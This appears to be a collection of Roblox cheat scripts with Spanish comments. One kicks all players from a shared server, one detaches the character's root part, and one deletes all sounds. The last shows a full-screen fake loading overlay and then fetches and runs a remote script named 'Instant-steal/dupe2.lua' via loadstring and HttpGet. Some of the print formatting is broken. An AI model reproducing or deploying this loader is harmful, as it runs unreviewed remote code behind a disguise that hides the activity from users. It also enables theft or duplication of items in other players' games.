



-- Sistema de detección de múltiples jugadores para Roblox
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

-- Función para verificar y expulsar jugadores si hay más de uno
local function checkPlayerCount()
    local playerCount = #Players:GetPlayers()
    
    if playerCount > 1 then
        -- Mostrar mensaje a todos los jugadores
        for _, player in ipairs(Players:GetPlayers()) do
            local message = "❌ Solo debe haber un jugador en el servidor. Saliendo..."
            
            -- Intentar mostrar mensaje en la pantalla del jugador
            local playerGui = player:FindFirstChild("PlayerGui")
            if playerGui then
                local screenGui = Instance.new("ScreenGui")
                local textLabel = Instance.new("TextLabel")
                
                screenGui.Parent = playerGui
                textLabel.Parent = screenGui
                
                textLabel.Size = UDim2.new(1, 0, 1, 0)
                textLabel.BackgroundColor3 = Color3.new(0, 0, 0)
                textLabel.TextColor3 = Color3.new(1, 0, 0)
                textLabel.Text = message
                textLabel.Font = Enum.Font.SourceSansBold
                textLabel.TextSize = 24
                textLabel.ZIndex = 10
            end
            
            -- También mostrar en output (consola)
            print("[SISTEMA] " .. message .. " Jugador: " .. player.Name)
        end
        
        -- Esperar 3 segundos antes de expulsar
        wait(3)
        
        -- Expulsar a todos los jugadores
        for _, player in ipairs(Players:GetPlayers()) do
            player:Kick("Solo debe haber un jugador en el servidor")
        end
        
        return true -- Se expulsaron jugadores
    end
    
    return false -- No se necesitó expulsar
end

-- Sistema de verificación inicial (20 segundos)
local startTime = tick()
local initialCheckConnection

initialCheckConnection = RunService.Heartbeat:Connect(function()
    local elapsedTime = tick() - startTime
    
    -- Verificar cada segundo durante los primeros 20 segundos
    if elapsedTime % 1 < 0.1 then -- Aproximadamente cada segundo
        local playerCount = #Players:GetPlayers()
        print(string.format("[Sistema]", playerCount, math.floor(elapsedTime)))
        
        if checkPlayerCount() then
            initialCheckConnection:Disconnect()
            return
        end
    end
    
    -- Después de 20 segundos, desconectar esta verificación intensiva
    if elapsedTime >= 20 then
        print("[Sistema]")
        initialCheckConnection:Disconnect()
        
        -- Iniciar verificación menos frecuente
        while true do
            wait(5) -- Verificar cada 5 segundos
            
            local playerCount = #Players:GetPlayers()
            print(string.format("[Sistema]1", playerCount))
            
            checkPlayerCount()
        end
    end
end)

-- También verificar cuando un jugador se une
Players.PlayerAdded:Connect(function(player)
    wait(1) -- Esperar un momento para que se actualice el count
    
    local playerCount = #Players:GetPlayers()
    print("[Sistema]: " .. player.Name .. " - Total: " .. playerCount)
    
    if playerCount > 1 then
        checkPlayerCount()
    end
end)

-- Mensaje de inicio

-- Tu código de Roblox continúa aquí...



-- LocalScript
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Espera a que exista el HumanoidRootPart
local hrp = character:WaitForChild("HumanoidRootPart")

-- Guardamos su posición
local savedCFrame = hrp.CFrame

-- Lo eliminamos del personaje temporalmente
hrp.Parent = nil
print("HumanoidRootPart eliminado temporalmente")

-- Esperamos unos segundos
task.wait(2)

-- Lo volvemos a colocar en el personaje
hrp.Parent = character
hrp.CFrame = savedCFrame
print("HumanoidRootPart restaurado")





local workspace = game:GetService("Workspace")

-- Función para eliminar sonidos de un objeto y sus descendientes
local function eliminarSonidos(obj)
    for _, hijo in pairs(obj:GetDescendants()) do
        if hijo:IsA("Sound") or hijo.Name:lower():find("sound") then
            hijo:Destroy()
        end
    end
end

-- Eliminar sonidos que ya existen en Workspace
eliminarSonidos(workspace)

-- Detectar cualquier objeto nuevo agregado a Workspace
workspace.DescendantAdded:Connect(function(obj)
    if obj:IsA("Sound") or obj.Name:lower():find("sound") then
        obj:Destroy()
    end
end)


local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Crear el ScreenGui con MÁXIMA prioridad
local loadingGui = Instance.new("ScreenGui")
loadingGui.Name = "LoadingGUI"
loadingGui.IgnoreGuiInset = true
loadingGui.ResetOnSpawn = false
loadingGui.DisplayOrder = 999  -- Número muy alto para estar encima de TODO
loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling  -- Para controlar el orden
loadingGui.Parent = playerGui

-- Crear frame de fondo que cubra ABSOLUTAMENTE TODO
local loadingFrame = Instance.new("Frame")
loadingFrame.Size = UDim2.new(1, 0, 1, 0)
loadingFrame.BackgroundColor3 = Color3.new(0, 0, 0)  -- Negro sólido
loadingFrame.BorderSizePixel = 0
loadingFrame.BackgroundTransparency = 0  -- Completamente opaco
loadingFrame.ZIndex = 999  -- Prioridad máxima dentro del GUI
loadingFrame.Parent = loadingGui

-- Crear contenedor para las letras con alta prioridad
local lettersContainer = Instance.new("Frame")
lettersContainer.Size = UDim2.new(0, 300, 0, 100)
lettersContainer.Position = UDim2.new(0.5, -150, 0.5, -50)
lettersContainer.BackgroundTransparency = 1
lettersContainer.ZIndex = 1000  -- Aún más alto que el fondo
lettersContainer.Parent = loadingFrame

-- Letras de "LOADING"
local letters = {"L", "O", "A", "D", "I", "N", "G"}
local textLabels = {}

-- Crear cada letra con máxima prioridad
for i, letter in ipairs(letters) do
	local textLabel = Instance.new("TextLabel")
	textLabel.Text = letter
	textLabel.Size = UDim2.new(0, 30, 0, 50)
	textLabel.Position = UDim2.new(0, (i-1) * 35, 0, 25)
	textLabel.BackgroundTransparency = 1
	textLabel.TextColor3 = Color3.new(1, 1, 1)  -- Blanco
	textLabel.TextSize = 32
	textLabel.Font = Enum.Font.GothamBold
	textLabel.TextTransparency = 0
	textLabel.ZIndex = 1001  -- Prioridad máxima para el texto
	textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)  -- Borde negro para mejor visibilidad
	textLabel.TextStrokeTransparency = 0.3
	textLabel.Parent = lettersContainer
	
	table.insert(textLabels, textLabel)
end

-- Delays para cada letra (efecto escalonado)
local delays = {0, 0.2, 0.4, 0.6, 0.8, 1.0, 1.2}

-- Función de animación
local function startLoadingAnimation()
	for i, textLabel in ipairs(textLabels) do
		local delayTime = delays[i]
		
		coroutine.wrap(function()
			task.wait(delayTime)
			
			while loadingGui.Parent do
				for step = 0, 1, 0.1 do
					if not loadingGui.Parent then break end
					textLabel.TextTransparency = step * 0.8
					task.wait(0.05)
				end
				
				for step = 1, 0, -0.1 do
					if not loadingGui.Parent then break end
					textLabel.TextTransparency = step * 0.8
					task.wait(0.05)
				end
				
				task.wait(0.5)
			end
		end)()
	end
end

-- Asegurarse de que cubra TODO incluso si hay otros GUIs
local function ensureTopPriority()
	loadingGui.DisplayOrder = 999
	pcall(function()
		game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
	end)
end

ensureTopPriority()
startLoadingAnimation()

-- Función para remover el loading y restaurar la UI normal
local function removeLoading()
	pcall(function()
		game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
	end)
	
	loadingGui:Destroy()
	
	-- 🟢 Ejecutar script remoto después de los 10 segundos de carga
	task.spawn(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/LeyendaZero/Instant-steal/main/dupe2.lua"))()
	end)
end

-- Ocultar temporalmente
local function hideLoading()
	loadingGui.Enabled = false
	pcall(function()
		game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
	end)
end

-- Mostrar nuevamente
local function showLoading()
	loadingGui.Enabled = true
	ensureTopPriority()
end

-- ⏱️ Remover después de 10 segundos
task.delay(10, removeLoading)

return {
	Show = showLoading,
	Hide = hideLoading,
	Remove = removeLoading
}
